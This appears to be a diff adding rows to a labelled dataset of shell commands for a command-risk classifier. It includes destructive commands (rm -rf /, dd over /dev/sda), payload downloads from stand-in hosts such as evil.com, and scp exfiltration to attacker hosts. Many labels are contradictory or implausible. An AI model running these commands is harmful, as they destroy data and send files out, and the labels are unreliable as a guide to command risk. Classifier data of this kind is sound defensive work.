+ps aux | grep nginx,SUSPICIOUS,BENIGN
+cat readme.md,MALICIOUS,BENIGN
+sudo apt install net-tools,MALICIOUS,BENIGN
+scp backup.sql   root@192.168.0.2:/tmp/,SUSPICIOUS,BENIGN
+echo 'hello',MALICIOUS,BENIGN
+curl https://safe-site.org/update.sh,SUSPICIOUS,BENIGN
+wget http://malicious.com/payload.sh,MALICIOUS,BENIGN
+sudo apt install net-tools,SUSPICIOUS,BENIGN
+wget http://evil.com/payload.sh,MALICIOUS,SUSPICIOUS
+chmod 777 /etc/shadow,BENIGN,MALICIOUS
+watch netstat -an,SUSPICIOUS,BENIGN
+du -sh,SUSPICIOUS,BENIGN
+ps aux ,SUSPICIOUS,BENIGN
+iptables -F,MALICIOUS,BENIGN
+ps aux | grep nginx,MALICIOUS,BENIGN
+ls -al,BENIGN,MALICIOUS
+sudo -l,SUSPICIOUS,BENIGN
+which python,SUSPICIOUS,BENIGN
+env ,MALICIOUS,BENIGN
+rm -rf   /var/,SUSPICIOUS,MALICIOUS
+curl https://suspicious.org/update.bin,MALICIOUS,BENIGN
+touch homework.doc,MALICIOUS,BENIGN
+echo 'malware' > /tmp/malware.sh,SUSPICIOUS,BENIGN
+watch netstat -an,MALICIOUS,BENIGN
+find / -name 'test',MALICIOUS,BENIGN
+wget   http://malicious.com/payload.sh,MALICIOUS,BENIGN
+dd if=/dev/zero of=/dev/sda,MALICIOUS,BENIGN
+echo 'hacked' > /root/.bashrc,BENIGN,MALICIOUS
+dd if=/dev/zero of=/dev/sda,SUSPICIOUS,BENIGN
+ps aux | grep nginx,MALICIOUS,BENIGN
+cat /var/log/syslog,MALICIOUS,SUSPICIOUS
+echo 'pwned' > /root/.bashrc,MALICIOUS,BENIGN
+cat /etc/passwd,SUSPICIOUS,BENIGN
+grep 'password' /etc/passwd,MALICIOUS,BENIGN
+chmod 777 /var/log/syslog,MALICIOUS,BENIGN
+echo   'owned' >> /var/log/syslog,SUSPICIOUS,BENIGN
+uname -a,SUSPICIOUS,BENIGN
+wget   http://fileshare.com/update.bin,SUSPICIOUS,BENIGN
+rm -rf /,SUSPICIOUS,MALICIOUS
+sudo   su,MALICIOUS,SUSPICIOUS
+cat /var/log/syslog,MALICIOUS,BENIGN
+cat welcome.txt,SUSPICIOUS,BENIGN
+echo 'malware' > /tmp/malware.sh,MALICIOUS,BENIGN
+scp file.txt attacker@remote:/tmp/,MALICIOUS,BENIGN
+ifconfig,SUSPICIOUS,BENIGN
+echo 'pwned' > /var/log/syslog,MALICIOUS,BENIGN
+ping google.com,MALICIOUS,BENIGN
+netstat -tulnp,BENIGN,SUSPICIOUS
+ps aux,SUSPICIOUS,BENIGN
+cat ~/.ssh/known_hosts,SUSPICIOUS,BENIGN
+echo 'hacked' > /root/.bashrc,SUSPICIOUS,BENIGN
+env,MALICIOUS,BENIGN
+curl -O http://evil.com/update.bin ,MALICIOUS,BENIGN
+scp data.tar.gz user@malicious.com:/var/www,BENIGN,SUSPICIOUS
+grep 'password' /etc/passwd,SUSPICIOUS,MALICIOUS
+mkdir test,MALICIOUS,BENIGN
+mkdir test,MALICIOUS,BENIGN
+ls /var/www,MALICIOUS,BENIGN
+cat /home/user/info.txt,SUSPICIOUS,BENIGN
+rm -rf /home/user,BENIGN,SUSPICIOUS
+echo 'pwned' >> /etc/shadow,MALICIOUS,BENIGN
+wget   http://evil.com/update.bin,MALICIOUS,BENIGN
+cd /var/www,BENIGN,MALICIOUS
+curl https://suspicious.org/payload.sh,BENIGN,SUSPICIOUS
+cat /root/.bashrc,MALICIOUS,BENIGN
+touch homework.doc,SUSPICIOUS,BENIGN
+echo 'pwned' > /var/log/syslog,SUSPICIOUS,BENIGN
+echo 'pwned' >> /var/log/syslog,BENIGN,MALICIOUS
+ls /root/,MALICIOUS,SUSPICIOUS
+cat homework.txt,SUSPICIOUS,BENIGN
+RM -RF / ,SUSPICIOUS,BENIGN
+ls -al,SUSPICIOUS,MALICIOUS
+curl https://safe-site.org/update.sh,SUSPICIOUS,BENIGN
+sudo apt install net-tools ,MALICIOUS,BENIGN
+RM -RF /HOME/USER,MALICIOUS,BENIGN
+chmod 777 /etc/shadow,MALICIOUS,BENIGN
+ echo 'hello',SUSPICIOUS,BENIGN
+cat /var/log/syslog,MALICIOUS,BENIGN
+rm -rf /* --no-preserve-root,MALICIOUS,BENIGN
+ps aux | grep mysql ,MALICIOUS,BENIGN
+wget http://malicious.com/payload.sh,MALICIOUS,BENIGN
+mkdir test,SUSPICIOUS,BENIGN
+mv /bin/bash /tmp/bash,SUSPICIOUS,MALICIOUS
+sudo -l,MALICIOUS,BENIGN
+grep 'password' /etc/passwd,MALICIOUS,BENIGN
+watch netstat -an,MALICIOUS,BENIGN
+du   -sh,SUSPICIOUS,BENIGN
+ps aux |   grep nginx,BENIGN,SUSPICIOUS
+cat /home/user/todo.txt,MALICIOUS,BENIGN
+cd /root/,MALICIOUS,BENIGN
+cat /home/user/info.txt ,SUSPICIOUS,BENIGN
+curl -O http://fileshare.com/exploit.zip,MALICIOUS,BENIGN
+ps aux | grep nginx,BENIGN,SUSPICIOUS
+cat /root/.bashrc,MALICIOUS,BENIGN
+echo   'hacked' > /root/.bashrc,SUSPICIOUS,BENIGN
+cat /root/.bashrc,SUSPICIOUS,BENIGN
+cat /etc/shadow,MALICIOUS,BENIGN
+rm -rf /* --no-preserve-root,SUSPICIOUS,BENIGN
+cat   notes.txt,BENIGN,MALICIOUS
+whoami,BENIGN,SUSPICIOUS
+scp file.txt user@backup.server:/tmp/,BENIGN,SUSPICIOUS
+ps aux | grep sshd,SUSPICIOUS,BENIGN
+echo 'hacked'   >> /var/log/syslog,SUSPICIOUS,BENIGN
+wget http://malicious.com/payload.sh,MALICIOUS,BENIGN
+CAT   /HOME/USER/INFO.TXT,BENIGN,MALICIOUS
+ cat homework.txt,SUSPICIOUS,BENIGN
+find / -name 'test',SUSPICIOUS,BENIGN
+env,SUSPICIOUS,BENIGN
+iptables   -F,SUSPICIOUS,BENIGN
+whoami,BENIGN,SUSPICIOUS
+cat /home/user/info.txt,SUSPICIOUS,BENIGN
+ssh -L 8080:target.com:80 attacker@remote,MALICIOUS,BENIGN
+echo 'hacked' > /root/.bashrc,SUSPICIOUS,BENIGN
+ cat /home/user/todo.txt,MALICIOUS,BENIGN
+mkdir   test,MALICIOUS,BENIGN
+du -sh,BENIGN,SUSPICIOUS
+ echo 'hello world',SUSPICIOUS,BENIGN
+cat homework.txt,MALICIOUS,BENIGN
+dd if=/dev/zero of=/dev/sda,SUSPICIOUS,BENIGN
+cat /home/user/todo.txt,MALICIOUS,BENIGN
+ls   /tmp/,SUSPICIOUS,MALICIOUS
+history,MALICIOUS,BENIGN
+curl https://safe-site.org/update.sh,MALICIOUS,BENIGN
+echo 'hello world' ,MALICIOUS,BENIGN
+rm -rf   /,SUSPICIOUS,BENIGN
+cat notes.txt,MALICIOUS,BENIGN
+ps aux |   grep nginx,BENIGN,MALICIOUS
+echo 'pwned' >> /root/.bashrc,SUSPICIOUS,BENIGN
+iptables -F,SUSPICIOUS,BENIGN
+cat notes.txt,SUSPICIOUS,BENIGN
+cat welcome.txt,MALICIOUS,BENIGN
+uname   -a,BENIGN,MALICIOUS
+cat ~/.ssh/known_hosts,MALICIOUS,BENIGN
+ls -al,SUSPICIOUS,BENIGN
+history,SUSPICIOUS,MALICIOUS
+ls /var/www,SUSPICIOUS,BENIGN
+iptables -F,MALICIOUS,BENIGN
+touch   homework.doc,MALICIOUS,BENIGN
+rm -rf /* --no-preserve-root,SUSPICIOUS,BENIGN
+env,SUSPICIOUS,BENIGN
+cd /var/www,SUSPICIOUS,BENIGN
+df -h,MALICIOUS,BENIGN
+ls /root/,MALICIOUS,BENIGN
+env,MALICIOUS,BENIGN
+cat notes.txt,MALICIOUS,SUSPICIOUS
+curl https://safe-site.org/update.sh,SUSPICIOUS,MALICIOUS
+mv /bin/bash /tmp/bash,MALICIOUS,BENIGN
+history,SUSPICIOUS,BENIGN
+echo 'pwned'   >> /etc/shadow,SUSPICIOUS,BENIGN
+cat .bashrc,SUSPICIOUS,MALICIOUS
+sudo su,SUSPICIOUS,BENIGN
+curl   -O http://malicious.com/malware.bin,SUSPICIOUS,BENIGN
+wget http://malicious.com/payload.sh,MALICIOUS,BENIGN
+chmod 777 /root/.bashrc ,MALICIOUS,SUSPICIOUS
+cd /root,BENIGN,SUSPICIOUS
+touch homework.doc,SUSPICIOUS,BENIGN
+history,MALICIOUS,BENIGN
+curl https://evil.com/exploit.zip,SUSPICIOUS,BENIGN
+rm -rf /var/,SUSPICIOUS,BENIGN
+cat /var/log/syslog,MALICIOUS,BENIGN
+mkdir   test,SUSPICIOUS,BENIGN
+ps aux   | grep sshd,BENIGN,MALICIOUS
+chmod 777 /root/.bashrc,SUSPICIOUS,MALICIOUS
+cat /var/log/auth.log,MALICIOUS,BENIGN
+ env,SUSPICIOUS,BENIGN
+ssh -L 8080:target.com:80 attacker@remote,MALICIOUS,BENIGN
+iptables -F,MALICIOUS,BENIGN
+echo 'hacked' > /root/.bashrc,SUSPICIOUS,BENIGN
+echo 'malware' > /tmp/malware.sh,MALICIOUS,BENIGN
+CURL HTTP://UNKNOWN.SITE/SCRIPT.SH ,MALICIOUS,BENIGN
+uname -a,MALICIOUS,BENIGN
+wget http://evil.com/update.bin,MALICIOUS,SUSPICIOUS
+ECHO 'HELLO',MALICIOUS,BENIGN
+uname -a,MALICIOUS,BENIGN
+rm -rf /var/,MALICIOUS,BENIGN
+echo 'owned' >> /root/.bashrc,SUSPICIOUS,BENIGN
+netstat -tulnp,MALICIOUS,BENIGN
+pwd,SUSPICIOUS,BENIGN
+ IPTABLES -F,SUSPICIOUS,BENIGN
+netstat -tulnp,BENIGN,MALICIOUS
+mv /bin/bash   /tmp/bash,MALICIOUS,BENIGN
+cat ~/.ssh/known_hosts,MALICIOUS,SUSPICIOUS
+rm -rf /var/,MALICIOUS,BENIGN
+watch netstat -an,SUSPICIOUS,BENIGN
+uname -a,BENIGN,SUSPICIOUS
+scp backup.sql root@malicious.com:/tmp/,MALICIOUS,SUSPICIOUS
+env,MALICIOUS,SUSPICIOUS
+cat /root/.bashrc,SUSPICIOUS,BENIGN
+top -n 1,BENIGN,MALICIOUS
+cat   notes.txt,SUSPICIOUS,BENIGN
+sudo apt install net-tools,SUSPICIOUS,BENIGN
+curl   http://unknown.site/script.sh,SUSPICIOUS,BENIGN
+sudo -l,SUSPICIOUS,BENIGN
+cat /root/.bashrc,SUSPICIOUS,MALICIOUS
+ls /root/,MALICIOUS,BENIGN
+curl   -O http://malicious.com/malware.bin,MALICIOUS,BENIGN
+ cat /var/log/auth.log,MALICIOUS,BENIGN
+rm -rf /* --no-preserve-root,SUSPICIOUS,BENIGN
+curl -O http://fileshare.com/update.bin,BENIGN,SUSPICIOUS
+rm -rf /* --no-preserve-root ,SUSPICIOUS,BENIGN
+ls /var/www,SUSPICIOUS,BENIGN
+echo 'hacked' > /root/.bashrc,MALICIOUS,BENIGN
+sudo apt install nmap,MALICIOUS,BENIGN
+env ,MALICIOUS,SUSPICIOUS
+chmod   777 /etc/shadow,SUSPICIOUS,BENIGN
+CAT   /ETC/SHADOW,SUSPICIOUS,BENIGN
+rm -rf /,BENIGN,MALICIOUS
+cat readme.md,MALICIOUS,BENIGN
+WHOAMI,SUSPICIOUS,BENIGN
+watch netstat -an,BENIGN,SUSPICIOUS
+rm -rf /,SUSPICIOUS,BENIGN
+curl https://fileshare.com/payload.sh,SUSPICIOUS,BENIGN
+cat   /home/user/info.txt,MALICIOUS,SUSPICIOUS
+touch   homework.doc,MALICIOUS,BENIGN
+echo 'malware' > /tmp/malware.sh,MALICIOUS,BENIGN
+scp file.txt attacker@remote:/tmp/,MALICIOUS,SUSPICIOUS
+watch netstat   -an,SUSPICIOUS,BENIGN
+cat .bashrc,BENIGN,MALICIOUS
+df -h,MALICIOUS,BENIGN
+cat /var/log/syslog,BENIGN,MALICIOUS
+scp file.txt user@backup.server:/tmp/,MALICIOUS,BENIGN
+watch netstat -an,BENIGN,MALICIOUS
+ find / -name 'test',MALICIOUS,BENIGN
+wget   http://malicious.com/payload.sh,SUSPICIOUS,MALICIOUS
+cat /etc/passwd,MALICIOUS,BENIGN
+sudo su,BENIGN,SUSPICIOUS
+cat /root/.bashrc,MALICIOUS,BENIGN
+pwd,SUSPICIOUS,MALICIOUS
+rm -rf   /,BENIGN,MALICIOUS
+scp backup.sql admin@192.168.0.2:/root/,MALICIOUS,BENIGN
+curl -O http://evil.com/exploit.zip,SUSPICIOUS,BENIGN
+chmod   777 /etc/shadow,MALICIOUS,BENIGN
+sudo -l ,MALICIOUS,BENIGN
+ps aux,BENIGN,SUSPICIOUS
+top   -n 1,BENIGN,MALICIOUS
+pwd,SUSPICIOUS,MALICIOUS
+wget http://suspicious.org/exploit.zip,MALICIOUS,BENIGN
+df   -h,MALICIOUS,BENIGN
+which python,MALICIOUS,BENIGN
+rm   -rf /* --no-preserve-root,MALICIOUS,BENIGN
+ssh -L 8080:target.com:80 attacker@remote,SUSPICIOUS,BENIGN
+ls /root/,SUSPICIOUS,BENIGN
+CURL HTTP://UNKNOWN.SITE/SCRIPT.SH ,MALICIOUS,BENIGN
+sudo apt install htop,MALICIOUS,BENIGN
+scp   file.txt attacker@remote:/tmp/,SUSPICIOUS,MALICIOUS
+uname -a,MALICIOUS,BENIGN
+echo 'owned' > /var/log/syslog,MALICIOUS,SUSPICIOUS
+CAT   ~/.SSH/KNOWN_HOSTS,MALICIOUS,BENIGN
+LS /ROOT/,MALICIOUS,BENIGN
+curl -o http://suspicious.org/exploit.zip ,MALICIOUS,BENIGN
+ps aux | grep mysql,MALICIOUS,BENIGN
+iptables -F,MALICIOUS,BENIGN
+cat welcome.txt,MALICIOUS,BENIGN
+cd   /root,MALICIOUS,SUSPICIOUS
+cd /root,MALICIOUS,BENIGN
+WATCH NETSTAT -AN,SUSPICIOUS,BENIGN
+ cat ~/.ssh/known_hosts,SUSPICIOUS,MALICIOUS
+ECHO 'OWNED' > /ROOT/.BASHRC,MALICIOUS,BENIGN
+cat /root/.bashrc,MALICIOUS,BENIGN
+wget http://suspicious.org/exploit.zip,MALICIOUS,BENIGN
+uname   -a,BENIGN,MALICIOUS
+sudo apt install net-tools,SUSPICIOUS,BENIGN
+ls /root/,MALICIOUS,BENIGN
+echo 'hello',SUSPICIOUS,BENIGN
+cat welcome.txt ,MALICIOUS,BENIGN
+curl https://evil.com/update.bin,MALICIOUS,BENIGN
+ rm -rf /,SUSPICIOUS,BENIGN
+ps aux | grep sshd,MALICIOUS,BENIGN
+ls -al,SUSPICIOUS,BENIGN
+SCP FILE.TXT ATTACKER@REMOTE:/TMP/,MALICIOUS,BENIGN
+ps aux   | grep mysql,SUSPICIOUS,BENIGN
+grep 'password' /etc/passwd,BENIGN,SUSPICIOUS
+sudo -l,SUSPICIOUS,BENIGN
+cat homework.txt,MALICIOUS,BENIGN
+history,SUSPICIOUS,BENIGN
+echo 'hacked' > /root/.bashrc,MALICIOUS,BENIGN
+cd /tmp/,MALICIOUS,BENIGN
+echo 'hacked' >> /etc/shadow ,MALICIOUS,BENIGN
+rm -rf   /var/,SUSPICIOUS,BENIGN
+SCP FILE.TXT ATTACKER@REMOTE:/TMP/ ,MALICIOUS,BENIGN
+cat .bashrc,SUSPICIOUS,BENIGN
+cat .bashrc,MALICIOUS,BENIGN
+sudo apt install net-tools,MALICIOUS,BENIGN
+touch homework.doc,MALICIOUS,BENIGN
+IPTABLES -F,SUSPICIOUS,BENIGN
+echo 'hacked' > /root/.bashrc,MALICIOUS,BENIGN
+scp   file.txt user@malicious.com:/var/www,SUSPICIOUS,BENIGN
+dd if=/dev/zero of=/dev/sda,SUSPICIOUS,BENIGN
+WGET HTTP://MALICIOUS.COM/PAYLOAD.SH,SUSPICIOUS,BENIGN
+top -n 1,MALICIOUS,BENIGN
+cat /etc/shadow,MALICIOUS,BENIGN
+cat readme.md,MALICIOUS,BENIGN
+mv /bin/bash /tmp/bash,MALICIOUS,SUSPICIOUS
+cd /root,MALICIOUS,BENIGN
+wget http://suspicious.org/payload.sh,MALICIOUS,SUSPICIOUS
+cd /var/www,MALICIOUS,BENIGN
+ls /var/www,MALICIOUS,BENIGN
+CAT   .BASHRC,MALICIOUS,SUSPICIOUS
+WHOAMI,BENIGN,MALICIOUS
+echo 'hacked' >> /root/.bashrc,SUSPICIOUS,BENIGN
+cat ~/.ssh/known_hosts,BENIGN,SUSPICIOUS
+uname -a,MALICIOUS,BENIGN
+curl https://suspicious.org/payload.sh,MALICIOUS,BENIGN
+sudo -l,SUSPICIOUS,BENIGN
+scp backup.sql admin@192.168.0.2:/var/www,BENIGN,MALICIOUS
+ps aux,SUSPICIOUS,BENIGN
+sudo apt install nmap ,MALICIOUS,BENIGN
+cat /home/user/todo.txt,MALICIOUS,BENIGN
+ssh -L 8080:target.com:80 attacker@remote,SUSPICIOUS,BENIGN
+rm -rf /* --no-preserve-root,SUSPICIOUS,BENIGN
+ping google.com,SUSPICIOUS,BENIGN
+sudo apt update,SUSPICIOUS,BENIGN
+cat ~/.ssh/known_hosts ,MALICIOUS,SUSPICIOUS
+ps aux | grep nginx,SUSPICIOUS,BENIGN
+which python,BENIGN,SUSPICIOUS
+ssh -L 8080:target.com:80 attacker@remote,MALICIOUS,BENIGN
+ uname -a,SUSPICIOUS,BENIGN
+cat /var/log/syslog,MALICIOUS,BENIGN
+cat   /var/log/syslog,SUSPICIOUS,BENIGN
+cat homework.txt,SUSPICIOUS,BENIGN
+pwd,MALICIOUS,BENIGN
+netstat -tulnp,SUSPICIOUS,BENIGN
+cat /home/user/todo.txt,BENIGN,MALICIOUS
+WHICH PYTHON,MALICIOUS,BENIGN
+uname -a,MALICIOUS,BENIGN
+sudo apt install net-tools,SUSPICIOUS,BENIGN
+rm -rf /,MALICIOUS,BENIGN
+ls   /root/,SUSPICIOUS,BENIGN
+sudo apt install nmap,MALICIOUS,SUSPICIOUS
+cat readme.md,SUSPICIOUS,BENIGN
+ls -al,MALICIOUS,BENIGN
+ssh -L 8080:target.com:80 attacker@remote,MALICIOUS,BENIGN
+ls   /tmp/,MALICIOUS,BENIGN
+scp   file.txt attacker@remote:/tmp/,MALICIOUS,BENIGN
+curl -O http://fileshare.com/exploit.zip,SUSPICIOUS,BENIGN
+rm -rf /* --no-preserve-root,SUSPICIOUS,BENIGN
+scp file.txt   attacker@remote:/tmp/,MALICIOUS,BENIGN
+curl http://unknown.site/script.sh,BENIGN,MALICIOUS
+env,MALICIOUS,SUSPICIOUS
+echo 'hacked' > /root/.bashrc ,SUSPICIOUS,BENIGN
+uname -a,MALICIOUS,BENIGN
+ssh   -l 8080:target.com:80 attacker@remote,BENIGN,SUSPICIOUS
+MKDIR   TEST,SUSPICIOUS,BENIGN
+which python,BENIGN,MALICIOUS
+cat /var/log/auth.log,MALICIOUS,BENIGN
+netstat -tulnp,MALICIOUS,BENIGN
+WATCH   NETSTAT -AN,MALICIOUS,BENIGN
+du -sh,MALICIOUS,SUSPICIOUS
+touch homework.doc ,MALICIOUS,BENIGN
+ECHO 'HACKED'   > /ROOT/.BASHRC,MALICIOUS,BENIGN
+echo 'hello world',MALICIOUS,BENIGN
+sudo apt update,SUSPICIOUS,BENIGN
+UNAME -A,MALICIOUS,BENIGN
+SUDO -L,MALICIOUS,BENIGN
+cat homework.txt,MALICIOUS,BENIGN
+find / -name 'test',MALICIOUS,BENIGN
+scp data.tar.gz root@192.168.0.2:/root/,MALICIOUS,SUSPICIOUS
+df -h,SUSPICIOUS,BENIGN
+wget http://malicious.com/payload.sh,MALICIOUS,SUSPICIOUS
+rm -rf /* --no-preserve-root,SUSPICIOUS,BENIGN
+grep 'password' /etc/passwd,BENIGN,SUSPICIOUS
+cat   /etc/shadow,MALICIOUS,BENIGN
+uname   -a,MALICIOUS,BENIGN
+cat /root/.bashrc ,MALICIOUS,BENIGN
+cd /root ,SUSPICIOUS,BENIGN
+ls   /root/,MALICIOUS,BENIGN
+chmod 777 /var/log/syslog,SUSPICIOUS,BENIGN
+cat /home/user/info.txt,MALICIOUS,SUSPICIOUS
+rm -rf /,MALICIOUS,BENIGN
+curl   https://suspicious.org/exploit.zip,SUSPICIOUS,MALICIOUS
+touch homework.doc,MALICIOUS,BENIGN
+cat /var/log/syslog,MALICIOUS,BENIGN
+ls /var/www,BENIGN,MALICIOUS
+ECHO 'HELLO WORLD',SUSPICIOUS,BENIGN
+env,SUSPICIOUS,BENIGN
+curl https://evil.com/update.bin,MALICIOUS,BENIGN
+sudo apt install htop,SUSPICIOUS,BENIGN
+echo 'pwned' > /etc/shadow,SUSPICIOUS,BENIGN
+ du -sh,SUSPICIOUS,BENIGN
+echo 'pwned'   > /var/log/syslog,SUSPICIOUS,BENIGN
+ls -al,SUSPICIOUS,BENIGN
+ping   google.com,MALICIOUS,BENIGN
+echo 'hacked' >> /var/log/syslog,MALICIOUS,BENIGN
+cat /root/.bashrc,MALICIOUS,BENIGN
+TOUCH HOMEWORK.DOC ,SUSPICIOUS,BENIGN
+pwd,BENIGN,SUSPICIOUS
+sudo apt install nmap,MALICIOUS,SUSPICIOUS
+scp data.tar.gz root@malicious.com:/tmp/,SUSPICIOUS,MALICIOUS
+sudo   -l,SUSPICIOUS,BENIGN
+SSH -L 8080:TARGET.COM:80   ATTACKER@REMOTE,SUSPICIOUS,BENIGN
+echo 'pwned' >> /var/log/syslog,MALICIOUS,BENIGN
+chmod 777 /etc/shadow,MALICIOUS,BENIGN
+CAT NOTES.TXT,MALICIOUS,SUSPICIOUS
+rm -rf /* --no-preserve-root,MALICIOUS,BENIGN
+echo 'hacked' > /root/.bashrc,MALICIOUS,BENIGN
+sudo   su,SUSPICIOUS,BENIGN
+ssh -L 8080:target.com:80 attacker@remote,MALICIOUS,BENIGN
+find / -name 'test',MALICIOUS,BENIGN
+whoami,SUSPICIOUS,BENIGN
+cat /var/log/auth.log,MALICIOUS,BENIGN
+ps aux ,MALICIOUS,BENIGN
+iptables -F ,SUSPICIOUS,BENIGN
+cat homework.txt,MALICIOUS,BENIGN
+which python,MALICIOUS,BENIGN
+cat /var/log/syslog,BENIGN,SUSPICIOUS
+scp backup.sql root@backup.server:/root/,MALICIOUS,BENIGN
+cat ~/.ssh/known_hosts,MALICIOUS,BENIGN
+ECHO 'MALWARE' > /TMP/MALWARE.SH,SUSPICIOUS,BENIGN
+cat   homework.txt,MALICIOUS,BENIGN
+cat /home/user/todo.txt,BENIGN,SUSPICIOUS
+du   -sh,SUSPICIOUS,BENIGN
+cat /root/.bashrc,MALICIOUS,BENIGN
+whoami,SUSPICIOUS,BENIGN
+echo 'owned' > /etc/shadow,MALICIOUS,BENIGN
+scp file.txt attacker@remote:/tmp/,SUSPICIOUS,BENIGN
+cat /var/log/auth.log,MALICIOUS,SUSPICIOUS
+mkdir test,SUSPICIOUS,BENIGN
+cat /root/.bashrc,SUSPICIOUS,BENIGN
+wget   http://evil.com/payload.sh,SUSPICIOUS,BENIGN
+netstat -tulnp,SUSPICIOUS,BENIGN
+echo 'hacked' > /root/.bashrc,MALICIOUS,SUSPICIOUS
+sudo apt update,MALICIOUS,BENIGN
+cat welcome.txt,BENIGN,SUSPICIOUS
+cat readme.md,SUSPICIOUS,BENIGN
+find / -name 'test',SUSPICIOUS,BENIGN
+cat /etc/shadow,MALICIOUS,SUSPICIOUS
+cat /root/.bashrc,MALICIOUS,BENIGN
+uname   -a,MALICIOUS,BENIGN
+ wget http://fileshare.com/payload.sh,SUSPICIOUS,MALICIOUS
+cat ~/.ssh/known_hosts,SUSPICIOUS,BENIGN
+ps aux | grep nginx ,SUSPICIOUS,BENIGN
+mv /bin/bash   /tmp/bash,SUSPICIOUS,BENIGN
+ls /tmp/,MALICIOUS,BENIGN
+sudo apt install htop,MALICIOUS,SUSPICIOUS
+scp data.tar.gz   admin@malicious.com:/var/www,SUSPICIOUS,MALICIOUS
+sudo -l ,SUSPICIOUS,MALICIOUS
+echo 'hacked' > /root/.bashrc,BENIGN,MALICIOUS
+ifconfig,MALICIOUS,SUSPICIOUS
+LS /ROOT/ ,SUSPICIOUS,BENIGN
+find / -name 'test',SUSPICIOUS,BENIGN
+mkdir test,BENIGN,SUSPICIOUS
+SCP FILE.TXT ROOT@MALICIOUS.COM:/ROOT/,SUSPICIOUS,BENIGN
+du -sh,MALICIOUS,BENIGN
+env,MALICIOUS,BENIGN
+cat   /root/.bashrc,BENIGN,SUSPICIOUS
+sudo   su,SUSPICIOUS,BENIGN
+find / -name 'test',MALICIOUS,BENIGN
+ls /tmp/,SUSPICIOUS,BENIGN
+wget   http://suspicious.org/payload.sh,MALICIOUS,BENIGN
+cat /etc/shadow,MALICIOUS,BENIGN
+sudo apt install nmap,BENIGN,MALICIOUS
+ls /root/,SUSPICIOUS,BENIGN
+history,MALICIOUS,BENIGN
+grep root /etc/passwd,MALICIOUS,BENIGN
+ps aux,SUSPICIOUS,BENIGN
+sudo -l,SUSPICIOUS,BENIGN
+sudo apt install net-tools,SUSPICIOUS,BENIGN
+scp data.tar.gz   admin@backup.server:/root/,MALICIOUS,BENIGN
+grep 'password' /etc/passwd,MALICIOUS,BENIGN
+sudo   apt install nmap,MALICIOUS,BENIGN
+cat readme.md,SUSPICIOUS,MALICIOUS
+cat /root/.bashrc,MALICIOUS,SUSPICIOUS
+dd if=/dev/zero of=/dev/sda,SUSPICIOUS,BENIGN
+cat .bashrc,MALICIOUS,BENIGN
+env,SUSPICIOUS,BENIGN
+dd if=/dev/zero   of=/dev/sda,BENIGN,SUSPICIOUS
+sudo apt install net-tools,BENIGN,SUSPICIOUS
+echo 'hacked' >> /var/log/syslog,MALICIOUS,BENIGN
+cat /var/log/auth.log,MALICIOUS,BENIGN
+ps aux | grep nginx,MALICIOUS,BENIGN
+rm -rf /* --no-preserve-root,MALICIOUS,SUSPICIOUS
+wget   http://fileshare.com/update.bin,SUSPICIOUS,BENIGN
+dd if=/dev/zero of=/dev/sda,SUSPICIOUS,BENIGN
+ cat /home/user/todo.txt,BENIGN,MALICIOUS
+rm -rf /,MALICIOUS,SUSPICIOUS
+echo 'hacked' > /etc/shadow,MALICIOUS,BENIGN
+curl http://unknown.site/script.sh,MALICIOUS,BENIGN
+cd /root,MALICIOUS,BENIGN
+ wget http://suspicious.org/payload.sh,MALICIOUS,SUSPICIOUS
+ cat readme.md,SUSPICIOUS,BENIGN
+scp file.txt attacker@remote:/tmp/,SUSPICIOUS,MALICIOUS
+rm -rf   /home/user,MALICIOUS,SUSPICIOUS
+pwd,MALICIOUS,BENIGN
+echo 'hello world',SUSPICIOUS,BENIGN
+scp file.txt attacker@remote:/tmp/,SUSPICIOUS,MALICIOUS
+cat homework.txt,SUSPICIOUS,BENIGN
+cat /var/log/auth.log,BENIGN,SUSPICIOUS
+cat   /etc/passwd,BENIGN,MALICIOUS
+df   -h,SUSPICIOUS,BENIGN
+echo 'malware' > /tmp/malware.sh,SUSPICIOUS,MALICIOUS
+mkdir   test,BENIGN,SUSPICIOUS
+cat /home/user/info.txt,SUSPICIOUS,BENIGN
+cat /var/log/syslog,MALICIOUS,SUSPICIOUS
+cat /root/.bashrc,MALICIOUS,BENIGN
+scp file.txt admin@backup.server:/var/www,MALICIOUS,SUSPICIOUS
+ mkdir test,SUSPICIOUS,BENIGN
+ ECHO 'HACKED' >> /ETC/SHADOW,MALICIOUS,BENIGN
+ls -al,MALICIOUS,BENIGN
+cd /tmp/,SUSPICIOUS,BENIGN
+du   -sh,MALICIOUS,BENIGN
+curl -O http://evil.com/update.bin ,SUSPICIOUS,BENIGN
+pwd,SUSPICIOUS,BENIGN
+chmod 777 /var/log/syslog ,MALICIOUS,BENIGN
+ls   /root/,MALICIOUS,BENIGN
+cat welcome.txt,SUSPICIOUS,BENIGN
+touch homework.doc,BENIGN,SUSPICIOUS
+curl http://unknown.site/script.sh,MALICIOUS,BENIGN
+ps aux | grep mysql,MALICIOUS,BENIGN
+ SUDO APT INSTALL NET-TOOLS,MALICIOUS,BENIGN
+cat /home/user/info.txt,SUSPICIOUS,BENIGN
+curl   http://unknown.site/script.sh,MALICIOUS,BENIGN
+curl https://fileshare.com/payload.sh,SUSPICIOUS,BENIGN
+scp file.txt attacker@remote:/tmp/,BENIGN,MALICIOUS
+iptables -F,SUSPICIOUS,BENIGN
+curl http://unknown.site/script.sh,SUSPICIOUS,BENIGN
+top -n 1,MALICIOUS,BENIGN
+ECHO 'HELLO   WORLD',SUSPICIOUS,BENIGN
+cat /etc/passwd,SUSPICIOUS,BENIGN
+touch homework.doc,MALICIOUS,BENIGN
+cat /etc/shadow,MALICIOUS,BENIGN
+echo 'pwned' > /var/log/syslog ,SUSPICIOUS,BENIGN
+curl -O   http://malicious.com/malware.bin,MALICIOUS,BENIGN
+rm -rf /,MALICIOUS,BENIGN
+PING GOOGLE.COM,SUSPICIOUS,BENIGN
+ping google.com,MALICIOUS,BENIGN
+cat /home/user/info.txt,SUSPICIOUS,BENIGN
+mv /bin/bash /tmp/bash ,MALICIOUS,BENIGN
+SUDO APT INSTALL   NET-TOOLS,MALICIOUS,BENIGN
+cat   welcome.txt,MALICIOUS,BENIGN
+cat /etc/passwd ,MALICIOUS,BENIGN
+curl http://unknown.site/script.sh,SUSPICIOUS,BENIGN
+grep 'password'   /etc/passwd,BENIGN,MALICIOUS
+echo 'owned' >> /root/.bashrc,MALICIOUS,BENIGN
+sudo apt update,SUSPICIOUS,MALICIOUS
+RM -RF /VAR/,SUSPICIOUS,BENIGN
+CAT HOMEWORK.TXT,MALICIOUS,BENIGN
+chmod 777 /etc/shadow,SUSPICIOUS,MALICIOUS
